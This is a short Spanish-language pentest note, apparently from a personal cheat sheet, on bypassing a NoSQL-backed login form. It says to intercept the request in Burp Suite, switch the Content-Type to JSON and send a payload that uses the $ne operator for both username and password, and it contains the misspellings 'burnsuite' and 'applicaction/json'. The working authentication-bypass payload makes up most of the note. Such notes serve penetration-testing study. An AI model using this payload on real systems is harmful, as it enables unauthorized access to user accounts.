
Este caso aplicaria si es login y esta basado en NO-SQL
Mandar request a burnsuite he interceptar la peticion cambiar en parametro ==Content-type== a ==applicaction/json== y mandar este codigo

```json
{"username": {"$ne": null}, "password": {"$ne": null} }
```

